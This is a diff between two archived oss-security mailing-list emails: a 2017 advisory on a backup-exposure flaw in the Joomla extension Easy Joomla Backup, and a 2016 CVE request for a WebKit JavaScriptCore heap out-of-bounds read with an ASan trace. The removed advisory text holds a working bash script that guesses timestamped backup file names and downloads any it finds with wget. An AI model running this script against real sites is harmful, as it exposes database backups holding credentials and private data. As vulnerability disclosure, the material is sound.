@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2428" "Thursday" "28" "September" "2017" "08:35:38" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>" "58" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" nil nil nil "9" "2017092812:35:38" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" (number mark "U       larry0@me.co Sep 28   58/2428  " thread-indent "\"[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4816" "Thursday" "10" "November" "2016" "15:07:51" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdRbBPaw4MCTH7eskU5r1xfM8WGAaLU--=aNjy6x0B6-QQ@mail.gmail.com>" "108" "[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core" nil nil nil "11" "2016111018:07:51" "[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core" (number mark "U       gustavo.grie Nov 10  108/4816  " thread-indent "\"[oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with the last revision of JavaScript Core\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 28638 invoked by uid 550); 28 Sep 2017 12:36:05 -0000
+Received: (qmail 24275 invoked by uid 550); 10 Nov 2016 18:08:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,87 +12,144 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 28604 invoked from network); 28 Sep 2017 12:36:04 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1506602141; bh=W1NpPdNuZkDbZWLVtoeJCxcsIMfKEWruATW5dfMj7Ig=;
-	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
-	b=UN8tzl9nOGWfJbXYW1AfALhnkivs2Jj4YNptbXK71DqWwnoLxaNM+JIwTEV7y+Q9t
- qXqXElIBQ7yzuM2y3LVQ0PYwGt7aL/cdFIdC+cb5aN6lKW5F172iPqA+y8beP0KLFG
- irtRz6SVEdHJAIUGn9YCPJKvj9JM/xqr72/qSCA7AqJf+Ps1DTe3813T+m14nib56u
- 0L+OTLahCHxmlCUWARMqmh8EcBVRgskys/UlPO+TMGSDo2UnVIQxBjsuBnjymxSWQp
- n3s7wk7Uyh/oF+9CDX+2r6Pm0bhNi7fK1gPoztF4VZ+cmk1OTLA8dJ9h3ps2zVoY1o
- R281OrvNCdg7w==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-09-28_04:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1707230000 definitions=main-1709280188
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Message-id: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
-Date: Thu, 28 Sep 2017 08:35:38 -0400
-To: Open Source Security <oss-security@lists.openwall.com>
-X-Mailer: Apple Mail (2.3273)
-Subject: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
+Received: (qmail 24242 invoked from network); 10 Nov 2016 18:08:09 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=/1WlD3z7AFAmXRmhOFYBgKY2H1xEvjJ96ktx3LYrpJc=;
+        b=XxBmO4lrfBLyQ/4Y24gZCg76qOxw99y5mGeACYc1TLr4eelsQjPqc1YPD5+ITU/vfQ
+         07rrTfuIMX6UIxdaf8nZXw6KvcKGxaRcGF+cMqIpEZbl7kaP+UW1GEMGUJ5jcQzzzBB4
+         8qpybM45qZR3XDpUnIMmvIckzw0+NA1UFyj1Nbrx2036074y5SxAm+rCumlTg5TjqwKF
+         mZ/03ypC3wWQosS7zrclXl1xvNv9Gavs6fqanY5F5YQiu1ofClA7vX6wy8PdxOScZOCJ
+         8DjLCYRG5AjG5kUMoR5MR15Bj57EWo6eTqWuK6+3vwQzHw90qjP9LOYqArOpAXQd9A9g
+         zx3A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=/1WlD3z7AFAmXRmhOFYBgKY2H1xEvjJ96ktx3LYrpJc=;
+        b=YJZY3aRrgeB+rWraF41sOag3Uwqyn/FfK91ziBUyMx3fSMaxwOH/J4ELCAFPrEW2w8
+         QJA2e2ox20OU/hDuqvHkK8B3LvqXM1eDRFpyN8G0fNmTa1QF4O5msoXaJsejfJyLrNFI
+         yH40MXgMkGfQt/6Emz3w8aTwU0JSSU5E2NI7VOj15HKI+1BUC5nPP3Gmi+f/rsaqN2kW
+         2YWSQSYgs7FS0nP39tz4pXQqJKso8W1yNPsb3eNnvqYkS7vFUFVJPkuqNyoO/J0E5I84
+         pi6NhQmPL2IDR//WqGosHPnLhcZoq1VdCsDk7Ba7PC6BZFTkSv8hGeOcXrAe0uFJgrv0
+         w8EA==
+X-Gm-Message-State: ABUngvc+3yjKbrAPkgFMybunOVbla0BYcWhML+voEUP6pPhvh3dF+eeq3v4rSdZxDD9E4KL9NmdfJxNHWJi/wQ==
+X-Received: by 10.107.55.136 with SMTP id e130mr7202723ioa.76.1478801272516;
+ Thu, 10 Nov 2016 10:07:52 -0800 (PST)
+MIME-Version: 1.0
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+Date: Thu, 10 Nov 2016 15:07:51 -0300
+Message-ID: <CACn5sdRbBPaw4MCTH7eskU5r1xfM8WGAaLU--=aNjy6x0B6-QQ@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary=001a114ac2808ab63c0540f64046
+Subject: [oss-security] CVE request: Heap read out-of-bounds parsing a Javascript file with
+ the last revision of JavaScript Core
 
-Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-09-07
-CVE-ID:[CVE-2017-2550]
-Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-bac=
-kup
-Vendor: kubik-rubik
-Vendor Notified: 2017-09-07
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D200
-Description: Easy Joomla Backup creates 'old-school' backups without any fr=
-ills.
-Vulnerability:
-The software creates a copy of the backup in the web root.  The file name i=
-s easily guessable as it's just a time stamp:
+--001a114ac2808ab63c0540f64046
+Content-Type: text/plain; charset=UTF-8
 
-http://example.com/administrator/components/com_easyjoomlabackup/backups/DO=
-MAIN_YEAR-MONTH-DAY_H-M-S.zip
+Hi,
 
-Exploit Code:
-	=E2=80=A2 #!/bin/bash
-	=E2=80=A2 #Larry W. Cashdollar, @_larry0 9/7/2017
-	=E2=80=A2 #Bruteforce download backups for Joomla Extension Easy Joomla Ba=
-ckup v3.2.4
-	=E2=80=A2 #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup
-	=E2=80=A2 MONTH=3D09
-	=E2=80=A2 DAY=3D07
-	=E2=80=A2 YEAR=3D2017
-	=E2=80=A2 Z=3D0
-	=E2=80=A2 #May need to set the DOMAIN to $1 the target depending on how WP=
- is configured.
-	=E2=80=A2 DOMAIN=3D192.168.0.163
-	=E2=80=A2=20=20
-	=E2=80=A2 echo "Scanning website for available backups:"
-	=E2=80=A2 for y in `seq -w 0 23`; do
-	=E2=80=A2         for x in `seq -w 0 59`; do
-	=E2=80=A2                  Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;
-	=E2=80=A2                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
-b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
-\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
-b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"
-	=E2=80=A2         for z in `seq -w 0 59`; do
-	=E2=80=A2                  Z=3D$(( $Z + 1 ));
-	=E2=80=A2                  CPATH=3D"http://$1/administrator/components/com=
-_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".=
-zip";
-	=E2=80=A2                  RESULT=3D`curl -s --head $CPATH|grep 200`;
-	=E2=80=A2                 if [ -n "$RESULT" ]; then
-	=E2=80=A2                  echo ""
-	=E2=80=A2                  echo "[+] Location $CPATH Found";
-	=E2=80=A2                  echo "[+] Received $RESULT";
-	=E2=80=A2                  echo "Downloading......";
-	=E2=80=A2                  wget $CPATH
-	=E2=80=A2                 fi;
-	=E2=80=A2         done
-	=E2=80=A2         done
-	=E2=80=A2 done
-	=E2=80=A2 echo "Completed."=
+We recently found a read out-of-bounds parsing JavaScript code in the last
+revision of WebKit (
+https://github.com/WebKit/webkit/commit/fcf81f3ad83cd910727c7a1824e50377a474c8f4).
+I tested this issue in ArchLinux (x86_64) but other configurations could be
+affected. To reproduce:
+
+1. Recompile jsc with ASAN support.
+2. Execute:
+
+$ ./jsc red.-4050783292692436029.nkpzevdpie.js
+...
+=================================================================
+==24637==ERROR: AddressSanitizer: heap-buffer-overflow on address
+0x603000014fc8 at pc 0x7ffff67f04b0 bp 0x7fffaccf8820 sp 0x7fffaccf8810
+READ of size 16 at 0x603000014fc8 thread T2
+==24637==AddressSanitizer: while reporting a bug found another one.
+Ignoring.
+    #0 0x7ffff67f04af in WTF::(anonymous namespace)::lockHashtable()
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cc4af)
+    #1 0x7ffff67f1b6c in WTF::ParkingLot::parkConditionallyImpl(void
+const*, WTF::ScopedLambda<bool ()> const&, WTF::ScopedLambda<void ()>
+const&, std::chrono::time_point<std::chrono::_V2::steady_clock,
+std::chrono::duration<long, std::ratio<1l, 1000000000l> > >)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cdb6c)
+    #2 0x7ffff67cc1cb in std::_Function_handler<void (),
+WTF::AutomaticThread::start(WTF::Locker<WTF::LockBase>
+const&)::{lambda()#1}>::_M_invoke(std::_Any_data const&)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20a81cb)
+    #3 0x7ffff67f7da5 in WTF::threadEntryPoint(void*)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20d3da5)
+    #4 0x7ffff685a530 in WTF::wtfThreadEntryPoint(void*)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x2136530)
+    #5 0x7ffff1df1453 in start_thread (/usr/lib/libpthread.so.0+0x7453)
+    #6 0x7ffff0c017de in __GI___clone (/usr/lib/libc.so.6+0xe87de)
+
+0x603000014fd0 is located 0 bytes to the right of 32-byte region
+[0x603000014fb0,0x603000014fd0)
+allocated by thread T2 here:
+    #0 0x7ffff6efee60 in __interceptor_malloc
+/build/gcc-multilib/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:62
+    #1 0x7ffff686792f in bmalloc::Allocator::allocateSlowCase(unsigned
+long)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x214392f)
+
+Thread T2 created by T0 here:
+    #0 0x7ffff6e69498 in __interceptor_pthread_create
+/build/gcc-multilib/src/gcc/libsanitizer/asan/asan_interceptors.cc:236
+    #1 0x7ffff685b983 in WTF::createThreadInternal(void (*)(void*), void*,
+char const*)
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x2137983)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow
+(/home/g/Work/Code/webkit-master/WebKitBuild/Release/lib/libjavascriptcoregtk-4.0.so.18+0x20cc4af)
+in WTF::(anonymous namespace)::lockHashtable()
+Shadow bytes around the buggy address:
+  0x0c067fffa9a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffa9b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffa9c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffa9d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffa9e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x0c067fffa9f0: fa fa fa fa fa fa 00 00 00[00]fa fa fd fd fd fd
+  0x0c067fffaa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffaa10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffaa20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffaa30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c067fffaa40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==24637==ABORTING
+
+I'm forwarding this issue since i receive no answer from the Webkit
+developers in more than 3 weeks. The original bug report (private) is here:
+
+https://bugs.webkit.org/show_bug.cgi?id=164000
+
+The reproducer are available upon request. Please assign a CVE if
+necessary.
+
+This issue was found using QuickFuzz.
+
+Regards,
+Gustavo.
+
+--001a114ac2808ab63c0540f64046--
